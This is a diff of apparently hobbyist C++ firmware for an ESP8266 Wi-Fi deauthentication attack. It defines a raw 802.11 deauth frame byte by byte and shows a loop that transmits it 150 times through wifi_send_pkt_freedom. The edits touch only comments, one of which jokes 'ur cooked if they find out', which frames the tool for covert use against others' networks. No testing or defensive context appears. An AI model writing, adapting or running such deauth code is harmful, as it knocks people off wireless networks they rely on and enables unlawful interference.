@@ -4,9 +4,14 @@
 
 #include "deauth.h"
 
-// deauth packet defined here
-// this is sent using the ESP8266WiFi library
-// this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
+/*
+
+the deauth packet is defined here.
+this is sent using the ESP8266WiFi library.
+this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
+
+*/
+
 uint8_t deauthPacket[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
     /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
@@ -62,7 +67,7 @@ void DeauthAttack::start() {
     running = true;
     int packetSize = sizeof(deauthPacket);
 
-    // send the deauth 150 times
+    // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
         wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), packetSize, 0);
         Serial.println("(>-<) Deauth packet sent!");
